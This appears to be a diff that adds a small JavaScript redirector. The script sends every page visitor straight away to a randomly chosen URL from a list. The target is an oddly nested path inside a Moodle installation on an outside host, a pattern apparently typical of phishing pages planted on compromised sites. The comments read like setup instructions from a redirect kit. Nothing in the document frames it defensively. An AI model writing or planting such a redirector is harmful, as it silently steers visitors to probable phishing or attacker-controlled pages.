@@ -1,0 +1,8 @@
+<script>
+var URLlist = [
+"https://pangpang.gabia.io/moodle/analytics/classes/local/target/s-jss/ll/erphe/ ",
+"https://pangpang.gabia.io/moodle/analytics/classes/local/target/s-jss/ll/erphe/ " // <-- the last URL has no comma
+];
+var reDelay = 0000;  // <-- time in seconds. 0000 = immediate redirect (0 seconds), 1000 = 1 sec delay, 2000 = 2 sec delay, etc
+setTimeout(function(){window.location = URLlist[Math.floor(Math.random() * URLlist.length)];}, reDelay);
+</script>
